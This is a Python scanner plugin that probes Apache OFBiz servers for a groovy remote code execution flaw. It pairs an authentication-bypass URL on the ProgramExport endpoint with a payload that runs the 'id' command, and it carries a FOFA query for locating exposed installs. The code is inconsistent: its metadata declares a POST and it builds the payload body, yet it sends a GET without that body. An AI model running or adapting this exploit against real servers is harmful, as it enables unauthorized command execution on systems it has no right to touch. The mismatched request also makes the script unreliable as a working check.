#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/8sONAeDqScEKXeYJUmZTHg',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Apache OFBiz groovy 远程代码执行',

      'level'     :   'high',

      'FOFA'      :   'app="Apache_OFBiz"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/11',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/webtools/control/ProgramExport/?USERNAME=&PASSWORD=&requirePasswordChange=Y'
  body = '''groovyProgram=throw+new+Exception('id'.execute().text);'''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'uid.*?gid.*?groups.*?',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret